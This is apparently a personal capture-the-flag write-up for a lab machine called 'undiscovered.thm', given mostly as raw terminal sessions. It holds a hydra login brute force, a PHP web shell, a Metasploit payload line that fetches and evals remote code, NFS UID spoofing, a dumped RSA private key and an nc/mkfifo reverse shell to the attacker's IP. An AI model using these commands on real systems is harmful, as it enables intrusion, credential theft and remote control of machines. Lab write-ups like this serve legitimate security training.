@@ -1,0 +1,509 @@
+IP:10.10.87.6
+
+root@LAPTOP-U5913CMD:/home/akshay# nmap -A -T4 10.10.87.6
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-05 18:52 IST
+Nmap scan report for 10.10.87.6
+Host is up (0.15s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
+|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
+|_  256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Did not follow redirect to http://undiscovered.thm
+111/tcp  open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100003  2,3,4       2049/udp   nfs
+|   100003  2,3,4       2049/udp6  nfs
+|   100021  1,3,4      41446/udp   nlockmgr
+|   100021  1,3,4      42801/tcp6  nlockmgr
+|   100021  1,3,4      44181/tcp   nlockmgr
+|   100021  1,3,4      46975/udp6  nlockmgr
+|   100227  2,3         2049/tcp   nfs_acl
+|   100227  2,3         2049/tcp6  nfs_acl
+|   100227  2,3         2049/udp   nfs_acl
+|_  100227  2,3         2049/udp6  nfs_acl
+2049/tcp open  nfs     2-4 (RPC #100003)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=11/5%OT=22%CT=1%CU=44251%PV=Y%DS=2%DC=T%G=Y%TM=5FA3FCC
+OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=2%ISR=104%TI=Z%CI=I%II=I%TS=8)OPS
+OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
+OS:1NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
+OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 995/tcp)
+HOP RTT       ADDRESS
+1   166.10 ms 10.9.0.1
+2   177.29 ms 10.10.87.6
+
+
+
+DOnt forget to check mount as nfs port is open.
+
+
+Remember....
+
+The path should be the darker one.
+
+
+SYN Stealth Scan Timing: About 41.78% done; ETC: 19:06 (0:02:37 remaining)
+Nmap scan report for undiscovered.thm (10.10.87.6)
+Host is up (0.14s latency).
+Not shown: 65530 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+2049/tcp  open  nfs
+44181/tcp open  unknown
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/undiscovered# dirb http://undiscovered.thm
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Nov  5 19:16:39 2020
+URL_BASE: http://undiscovered.thm/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://undiscovered.thm/ ----
+==> DIRECTORY: http://undiscovered.thm/images/                                                                          
++ http://undiscovered.thm/index.php (CODE:200|SIZE:355)                                                                 
++ http://undiscovered.thm/server-status (CODE:403|SIZE:281)                                                             
+                                                                                                                        
+---- Entering directory: http://undiscovered.thm/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+-----------------
+END_TIME: Thu Nov  5 19:28:37 2020
+DOWNLOADED: 4612 - FOUND: 2
+
+
+Found nothing with dirb and also with nikto
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/undiscovered# nikto -h undiscovered.thm
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.87.6
++ Target Hostname:    undiscovered.thm
++ Target Port:        80
++ Start Time:         2020-11-05 18:54:13 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-3268: /images/: Directory indexing found.
+^T^T+ OSVDB-3233: /icons/README: Apache default file found.
++ 7785 requests: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2020-11-05 19:14:51 (GMT5.5) (1238 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+I found nothing after downloading the image and looking for some stegano text.
+Then I thought of subdomain enumeration.
+I fired up wfuzz and found these many subdomains.
+
+root@LAPTOP-U5913CMD:/opt/knock/knockpy# wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.undiscovered.thm" --hc 302 --hw 356 -t 100 10.10.87.6
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/bing.py Exception, msg=No module named 'shodan'
+libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/shodanp.py Exception, msg=No module named 'shodan'
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.87.6/
+Total requests: 19983
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                           
+===================================================================
+
+000000492:   200        68 L     341 W    4584 Ch     "manager"                                                         
+000000517:   200        68 L     341 W    4626 Ch     "dashboard"                                                       
+000000523:   200        82 L     341 W    4650 Ch     "deliver"                                                         
+000000567:   200        68 L     341 W    4584 Ch     "newsite"                                                         
+000000613:   200        68 L     341 W    4584 Ch     "develop"                                                         
+000000629:   200        68 L     341 W    4584 Ch     "network"                                                         
+000000631:   200        68 L     341 W    4542 Ch     "forms"                                                           
+000000634:   200        68 L     341 W    4668 Ch     "maintenance"                                                     
+000000666:   200        68 L     341 W    4521 Ch     "view"                                                            
+000000675:   200        68 L     341 W    4605 Ch     "mailgate"                                                        
+000000679:   200        68 L     341 W    4521 Ch     "play"                                                            
+000000681:   200        68 L     341 W    4542 Ch     "start"                                                           
+000000686:   200        83 L     341 W    4599 Ch     "booking"                                                         
+000000692:   200        68 L     341 W    4605 Ch     "terminal"                                                        
+000000695:   200        68 L     341 W    4521 Ch     "gold"                                                            
+000000697:   200        68 L     341 W    4605 Ch     "internet"                                                        
+000000703:   200        68 L     341 W    4626 Ch     "resources"                                                       
+000009543:   400        12 L     53 W     422 Ch      "#www"                                                            
+000010595:   400        12 L     53 W     422 Ch      "#mail"                                                           
+
+Total time: 77.92031
+Processed Requests: 19983
+Filtered Requests: 19964
+Requests/sec.: 256.4543
+
+root@LAPTOP-U5913CMD:/opt/knock/knockpy#
+
+
+Lets change the /etc/hosts file.
+
+192.168.0.104   gateway.docker.internal
+127.0.0.1       kubernetes.docker.internal
+10.10.87.6      undiscovered.thm
+10.10.87.6      dashboard.undiscovered.thm
+
+
+Yeah it works.
+THere's RiteCMS present.
+
+
+RiteCMS Version:2.2.1
+
+RiteCMS 2.2.1 - Authenticated Remote Code Execution                                                                                                       | php/webapps/48636.txt
+
+WE have to find some credentials to get access.
+
+Ok we got a lot of subdomains and everyone seems to be working.
+But I found out this vulnerability.
+
+
+
+# Exploit Title: RiteCMS 2.2.1 - Authenticated Remote Code Execution
+# Date: 2020-07-03
+# Exploit Author: Enes Özeser
+# Vendor Homepage: http://ritecms.com/
+# Version: 2.2.1
+# Tested on: Linux
+# CVE: CVE-2020-23934
+
+1- Go to following url. >> http://(HOST)/cms/
+2- Default username and password is admin:admin. We must know login credentials.
+3- Go to "Filemanager" and press "Upload file" button.
+4- Choose your php web shell script and upload it.
+
+PHP Web Shell Code == <?php system($_GET['cmd']); ?>
+
+5- You can find uploaded file there. >> http://(HOST)/media/(FILE-NAME).php
+6- We can execute a command now. >> http://(HOST)/media/(FILE-NAME).php?cmd=id
+
+And after through /cms/ it gave me 404 error.
+After changing the subdomains,it finally gave me a login page at:
+
+http://deliver.undiscovered.thm/cms/
+
+Lets complete our exploit.
+
+root@LAPTOP-U5913CMD:/home/akshay# dirb http://deliver.undiscovered.thm/
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Nov  5 19:55:43 2020
+URL_BASE: http://deliver.undiscovered.thm/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://deliver.undiscovered.thm/ ----
+==> DIRECTORY: http://deliver.undiscovered.thm/cms/                                                                     
+==> DIRECTORY: http://deliver.undiscovered.thm/data/
+
+Default username and password was not working.
+
+
+Got this under /data/
+
+CREATE TABLE rite_userdata (id INTEGER PRIMARY KEY AUTOINCREMENT, name varchar(255) NOT NULL default '', type tinyint(4) NOT NULL default '0', pw varchar(255) NOT NULL default '', last_login int(11) NOT NULL default '0', wysiwyg tinyint(4) NOT NULL default '0');
+
+INSERT INTO rite_userdata VALUES(1, 'admin', 1, '75470d05abd21fb5e84e735d2bc595e2f7ecc5c7a5e98ad0d7', 1230764400, 0);
+
+
+This hash cant be cracked.
+So lets brute force the web page
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/undiscovered# hydra -l admin -P /home/akshay/Downloads/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:login_failed"
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-05 20:14:30
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/index.php:username=^USER^&userpw=^PASS^:login_failed
+[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-05 20:14:36
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/undiscovered#
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/undiscovered# nano script.php
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/undiscovered# cat script.php
+<?php system($_GET['cmd']); ?>
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/undiscovered#
+
+
+Upload the script from the file manager.
+
+http://deliver.undiscovered.thm/media/script.php?cmd=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+msf6 exploit(multi/script/web_delivery) > set target 1
+target => 1
+msf6 exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+msf6 exploit(multi/script/web_delivery) > options
+
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   PHP
+
+
+msf6 exploit(multi/script/web_delivery) > set lhost tun0
+lhost => 10.9.81.62
+msf6 exploit(multi/script/web_delivery) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.9.81.62:4444
+[*] Using URL: http://0.0.0.0:8080/6fkdk8CFj5mpAV
+msf6 exploit(multi/script/web_delivery) > [*] Local IP: http://172.22.145.181:8080/6fkdk8CFj5mpAV
+[*] Server started.
+[*] Run the following command on the target machine:
+php -d allow_url_fopen=true -r "eval(file_get_contents('http://10.9.81.62:8080/6fkdk8CFj5mpAV', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
+[*] 10.10.133.255    web_delivery - Delivering Payload (1111 bytes)
+[*] Sending stage (39282 bytes) to 10.10.133.255
+[*] Meterpreter session 1 opened (10.9.81.62:4444 -> 10.10.133.255:39690) at 2020-11-05 20:18:41 +0530
+
+
+Stable shell using Python
+
+meterpreter > shell
+Process 1445 created.
+Channel 0 created.
+python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$
+
+So we have to get access to machien as william.
+
+We have to mount but for that to happen we should have privileges as william in machine.
+We can adduser as william having same uid as that of victim's machine.
+
+useradd -u 3003 -d /dev/shm william
+
+ggwp:x:1001:1002:,,,:/home/ggwp:/bin/bash
+william:x:3003:3003::/dev/shm:/bin/sh
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/undiscovered# mkdir /tmp/work
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/undiscovered# mount -t nfs 10.10.156.163:/home/william /tmp/work
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/undiscovered# cd /tmp
+root@LAPTOP-U5913CMD:/tmp# cd work
+bash: cd: work: Permission denied
+root@LAPTOP-U5913CMD:/tmp#
+
+Now change the user
+
+root@LAPTOP-U5913CMD:/tmp# su william
+$ id
+uid=3003(william) gid=3003(william) groups=3003(william)
+$ cd work
+$ ls -la
+total 44
+drwxr-x---  4 4294967294 4294967294 4096 Sep  9 22:06 .
+drwxrwxrwt 55 root       root       4096 Nov  5 20:59 ..
+-rw-------  1 4294967294 4294967294    0 Sep  9 19:16 .bash_history
+-rw-r--r--  1 4294967294 4294967294 3771 Sep  4 19:46 .bashrc
+drwx------  2 4294967294 4294967294 4096 Sep  4 16:03 .cache
+drwxrwxr-x  2 4294967294 4294967294 4096 Sep  4 19:19 .nano
+-rw-r--r--  1 4294967294 4294967294   43 Sep  4 19:49 .profile
+-rwxr-xr-x  1 4294967294 4294967294  128 Sep  4 19:13 admin.sh
+-rwsrwsr-x  1 4294967294 4294967294 8776 Sep  4 19:41 script
+-rw-r-----  1 4294967294 4294967294   38 Sep  9 22:06 user.txt
+$ mkdir .ssh
+
+
+$ cd .ssh
+$ touch authorized_keys
+$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqs85VzmP9T/JRNSOv9D0N7EwJHLjQqq+KluZ+jnECjyVDPAnbaJaJNEuz+6/fnKU1ThYnAqbP3Asuyiob9LJVg4hhjO1IMqXJlZ97tDe6AM79zkVlpjSgydBTC9Mpqpk6F5Xq/xoYOlBHZ5lFXcT6yB/EnBC6pdKW9xuoDPDD7/Z62IUfsRZ0W/jAKLzoWV8hNi0ZEJm5lahJ6sRxydcauMyMRGmlyjth/MW2fr6VfsZQ6FM5QBFwYYPsyVyc065UQV02NNtXeZhNcOI8QjTB3gIzdi91+P97eRRlpv4sHq/geOYEuSyzm9mkb3OHN7n/M7u+j5XupRHRHfDRdg0X8Dj/niXu8v4WSmAschDYWX2PydNfDz2YBrQy4eFDg4RHG0peJu0dTqDIntA4s98cfnAm/yeEjBEi4AeC8WSH1DZJ3Xrg019gDIhyOh8BGgZmC3DyiRvgE1j92GcM2ivU0zq+CGmCvzLry9eYf1+KoXPuSnYNGr2TPONyJ+jl4bk= root@LAPTOP-U5913CMD
+" > authorized_keys
+$
+
+
+root@LAPTOP-U5913CMD:~/.ssh# ssh -i id_rsa william@10.10.156.163
+The authenticity of host '10.10.156.163 (10.10.156.163)' can't be established.
+ECDSA key fingerprint is SHA256:4FZwE+zBYXSpNWyxNclsv843P0McfDHD9nPMOH26bek.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.156.163' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Thu Sep 10 00:35:09 2020 from 192.168.0.147
+william@undiscovered:~$ id
+uid=3003(william) gid=3003(william) groups=3003(william)
+william@undiscovered:~$
+
+william@undiscovered:~$ strings script
+/lib64/ld-linux-x86-64.so.2
+n2JP
+libc.so.6
+setreuid
+__stack_chk_fail
+strcat
+system
+__libc_start_main
+__gmon_start__
+GLIBC_2.2.5
+GLIBC_2.4
+UH-P
+/bin/catH
+ /home/lH
+eonard/
+dH34%(
+
+See the script is actually using cat command to display the contents in the leonard's directory.
+
+william@undiscovered:~$ ls
+admin.sh  script  user.txt
+william@undiscovered:~$ ./script gg
+/bin/cat: /home/leonard/gg: No such file or directory
+william@undiscovered:~$ ./script .ssh
+/bin/cat: /home/leonard/.ssh: Is a directory
+
+
+william@undiscovered:~$ ./script .ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
+HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df
+YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn
+SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih
+hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL
++ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN
+C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt
++1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i
+72C1iphGoLMaHVq6Lh/S4L7COSpPVU5LnB7CJ56RmZMAKRORxuFw3W9B8SyV6UGg
+Jb1l9ksAmGvdBJGzWgeFFj82iIKZkrx5Ml4ZDBaS39pQ1tWfx1wZYwWw4rXdq+xJ
+xnBOG2SKDDQYn6K6egW2+aNWDRGPq9P17vt4rqBn1ffCLtrIN47q3fM72H0CRUJI
+Ktn7E2ECgYEA3fiVs9JEivsHmFdn7sO4eBHe86M7XTKgSmdLNBAaap03SKCdYXWD
+BUOyFFQnMhCe2BgmcQU0zXnpiMKZUxF+yuSnojIAODKop17oSCMFWGXHrVp+UObm
+L99h5SIB2+a8SX/5VIV2uJ0GQvquLpplSLd70eVBsM06bm1GXlS+oh8CgYEA3cWc
+TIJENYmyRqpz3N1dlu3tW6zAK7zFzhTzjHDnrrncIb/6atk0xkwMAE0vAWeZCKc2
+ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ
+iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg
+zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK
+3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk
+OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8
+jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld
+sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+
+cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa
+bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
+LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
+-----END RSA PRIVATE KEY-----
+william@undiscovered:~$
+
+
+
+root@LAPTOP-U5913CMD:/tmp# ssh -i id_rsa leonard@10.10.156.163
+load pubkey "id_rsa": invalid format
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Fri Sep  4 22:57:43 2020 from 192.168.68.129
+leonard@undiscovered:~$ id
+uid=1002(leonard) gid=1002(leonard) groups=1002(leonard),3004(developer)
+leonard@undiscovered:~$
+
+leonard@undiscovered:~$ cat .viminfo
+# This viminfo file was generated by Vim 7.4.
+# You may edit it if you're careful!
+
+# Value of 'encoding' when this file was written
+*encoding=utf-8
+
+:py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.81.62 1234 >/tmp/f")
+        "       1       0
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/undiscovered# nc -nvlp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.156.163 56894
+# id
+uid=0(root) gid=1002(leonard) groups=1002(leonard),3004(developer)
+
+Thank you :)
